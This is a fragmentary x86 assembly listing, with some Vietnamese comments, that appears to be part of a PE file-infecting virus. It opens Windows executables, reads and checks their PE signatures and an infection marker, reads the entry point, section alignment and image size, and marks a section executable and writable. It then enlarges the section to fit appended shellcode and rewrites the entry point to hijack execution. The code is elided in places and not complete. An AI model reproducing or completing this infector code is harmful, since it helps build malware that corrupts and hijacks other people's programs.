...
; createfile(findata, generic_read or generic_write, null, open_existing, file_attribute_normal, null)
push 0
push 20h
push 3
push 0
...
;readfile(hFile, HostSignature, 2, numByteRead, null)
push 0
...
; setfilepointer(hFile, pesignture, 0, 0)
push 0
push 0
push 3ch
push[hFileHost + esi]
...
; readfile(hFile, pesignature, ntHeader, 4, numOfByteRead)
push 0
mov eax, offset numOfByteRead
add eax, esi
push eax
...
; Check PE signature and signature shellcode

;setfilepointer(hFile, pesignature, 0, 0)
push 0
push 0
...
;readfile(hFile, hostsignature, 4, numbytereaded, 0)
mov[Signature + esi], 0
push 0
mov eax, offset numOfByteRead
add eax, esi
...
;readfile(hFile, hostsignature, 14, numofbytereaded, 0)
push 0
mov eax, offset numOfByteRead
add eax, esi
push eax
...
;setfilepionter(hFile, sectionAlignment, 0, 0)
push 0
push 0
...
;readfile(hFile, sectionAlignment, 8, numbytereaded, 0)
push 0
mov eax, offset numOfByteRead
add eax, esi
push eax
...
;readfile(hFile, entrypoint, 4, numofbyteread, 0)
push 0
mov eax, offset numOfByteRead
add eax, esi
push eax
...
;readfile(hFile, sizeOfImage, 4, numOfByteRead, 0)
push 0
mov eax, offset numOfByteRead
add eax, esi
push eax
...
;Chỉnh sửa rawsize, virtualsize, characteristics
; new RawSize,Virtual size,characteristic
mov[Characteristics + esi], 0E0000040h

; rawsize = rawsize + size shellcode
...
;ghi entry point
;newEP = hotSize - rawaddress + virtualaddress
push 2
push 0
push 0
push[hFileHost + esi]
